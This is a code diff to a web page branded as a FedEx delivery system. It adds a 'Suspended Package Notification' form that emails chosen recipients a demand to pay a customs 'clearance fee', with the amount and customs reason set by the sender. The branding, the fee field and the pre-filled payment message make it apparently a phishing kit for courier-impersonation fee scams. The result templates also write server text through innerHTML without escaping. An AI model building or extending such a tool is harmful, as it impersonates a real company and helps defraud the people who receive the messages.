@@ -39,16 +39,21 @@
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         .address-hint { font-size: 12px; color: #666; margin-top: 5px; font-style: italic; }
         .map-icon { color: #4d148c; margin-right: 5px; }
+        .suspended-section { background: #fff3cd; padding: 25px; border-radius: 10px; border: 2px solid #ffeaa7; margin: 40px 0; }
+        .suspended-header { color: #856404; text-align: center; margin-bottom: 20px; }
+        .suspended-btn { background: linear-gradient(45deg, #dc3545, #ff6b6b); }
+        .divider { margin: 40px 0; border: 1px solid #eee; }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
-            <h1>📦 FedEx Product Delivery</h1>
-            <p>Send fun product notifications to your friends!</p>
+            <h1>📦 FedEx Delivery System</h1>
+            <p>Send product delivery notifications and suspended package alerts</p>
         </div>
 
         <div class="form-container">
+            <!-- Regular Product Delivery Form -->
             <form id="taskForm" enctype="multipart/form-data">
                 <!-- Recipient Details -->
                 <div class="form-section">
@@ -162,6 +167,90 @@
             </div>
 
             <div id="result"></div>
+
+            <!-- Divider -->
+            <div class="divider"></div>
+
+            <!-- Suspended Package Form -->
+            <div class="suspended-section">
+                <div class="suspended-header">
+                    <h3>🚨 Suspended Package Notification</h3>
+                    <p>Send notifications for packages held at customs</p>
+                </div>
+
+                <form id="suspendedPackageForm" enctype="multipart/form-data">
+                    <!-- Recipient Details -->
+                    <div class="form-grid">
+                        <div class="form-group">
+                            <label for="suspendedRecipientEmail">Recipient Email *</label>
+                            <input type="email" id="suspendedRecipientEmail" name="recipientEmail" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="suspendedRecipientName">Recipient Name *</label>
+                            <input type="text" id="suspendedRecipientName" name="recipientName" required>
+                        </div>
+                    </div>
+
+                    <!-- Package Details -->
+                    <div class="form-grid">
+                        <div class="form-group">
+                            <label for="packageName">Package Name *</label>
+                            <input type="text" id="packageName" name="packageName" placeholder="e.g., Electronic Device Package" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="suspendedSpecialId">Special ID (Optional)</label>
+                            <input type="text" id="suspendedSpecialId" name="specialId" placeholder="Auto-generated if empty">
+                        </div>
+                        <div class="form-group">
+                            <label for="clearanceFee">Clearance Fee *</label>
+                            <input type="text" id="clearanceFee" name="clearanceFee" placeholder="e.g., $150.00" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="distributionHub">Distribution Hub</label>
+                            <input type="text" id="distributionHub" name="distributionHub" placeholder="e.g., Main Distribution Hub">
+                        </div>
+                    </div>
+
+                    <!-- Customs Reason -->
+                    <div class="form-group">
+                        <label for="customsReason">Customs Reason *</label>
+                        <select id="customsReason" name="customsReason" required>
+                            <option value="Outstanding customs charge">Outstanding customs charge</option>
+                            <option value="Documentation required">Documentation required</option>
+                            <option value="Prohibited item review">Prohibited item review</option>
+                            <option value="Tax payment required">Tax payment required</option>
+                            <option value="Import license needed">Import license needed</option>
+                        </select>
+                    </div>
+
+                    <!-- Package Image -->
+                    <div class="form-group">
+                        <label>Package Image (Optional)</label>
+                        <div class="file-input">
+                            <input type="file" id="suspendedPackageImage" name="packageImage" accept="image/*">
+                            <label for="suspendedPackageImage" class="file-input-label">
+                                📸 Click to upload package image
+                            </label>
+                        </div>
+                        <div class="file-preview" id="suspendedImagePreview"></div>
+                    </div>
+
+                    <!-- Custom Message -->
+                    <div class="form-group">
+                        <label for="suspendedMessage">Custom Message</label>
+                        <textarea id="suspendedMessage" name="contactMessage" placeholder="Enter custom message about the suspended package...">You need to pay the clearance fee before your package can be distributed. For more information contact our customer service.</textarea>
+                    </div>
+
+                    <button type="submit" class="submit-btn suspended-btn">🚨 Send Suspended Package Notification</button>
+                </form>
+
+                <div class="loading" id="suspendedLoading" style="display: none;">
+                    <div class="spinner"></div>
+                    <p>Sending suspended package notification...</p>
+                </div>
+
+                <div id="suspendedResult"></div>
+            </div>
         </div>
     </div>
 
@@ -222,6 +311,79 @@
                     result.innerHTML = `
                         <div class="result-message error">
                             <h3>❌ Failed to send notification</h3>
+                            <p>${data.message}</p>
+                        </div>
+                    `;
+                }
+            } catch (error) {
+                result.innerHTML = `
+                    <div class="result-message error">
+                        <h3>❌ Error occurred</h3>
+                        <p>Please check your internet connection and try again.</p>
+                    </div>
+                `;
+            } finally {
+                submitBtn.disabled = false;
+                loading.style.display = 'none';
+            }
+        });
+
+        // Suspended Package Image Preview
+        document.getElementById('suspendedPackageImage').addEventListener('change', function(e) {
+            const file = e.target.files[0];
+            const preview = document.getElementById('suspendedImagePreview');
+            const label = document.querySelector('[for="suspendedPackageImage"]');
+            
+            if (file) {
+                const reader = new FileReader();
+                reader.onload = function(e) {
+                    preview.innerHTML = `<img src="${e.target.result}" alt="Preview">`;
+                    label.textContent = `✅ ${file.name} selected`;
+                };
+                reader.readAsDataURL(file);
+            } else {
+                preview.innerHTML = '';
+                label.textContent = '📸 Click to upload package image';
+            }
+        });
+
+        // Suspended Package Form Submission
+        document.getElementById('suspendedPackageForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const formData = new FormData(this);
+            const submitBtn = this.querySelector('.submit-btn');
+            const loading = document.getElementById('suspendedLoading');
+            const result = document.getElementById('suspendedResult');
+            
+            // Show loading
+            submitBtn.disabled = true;
+            loading.style.display = 'block';
+            result.innerHTML = '';
+            
+            try {
+                const response = await fetch('/send-suspended-package', {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    result.innerHTML = `
+                        <div class="result-message success">
+                            <h3>✅ Suspended package notification sent successfully!</h3>
+                            <p><strong>Special ID:</strong> ${data.specialId}</p>
+                            <p>The recipient has been notified about the suspended package and clearance requirements.</p>
+                        </div>
+                    `;
+                    this.reset();
+                    document.getElementById('suspendedImagePreview').innerHTML = '';
+                    document.querySelector('[for="suspendedPackageImage"]').textContent = '📸 Click to upload package image';
+                } else {
+                    result.innerHTML = `
+                        <div class="result-message error">
+                            <h3>❌ Failed to send suspended package notification</h3>
                             <p>${data.message}</p>
                         </div>
                     `;
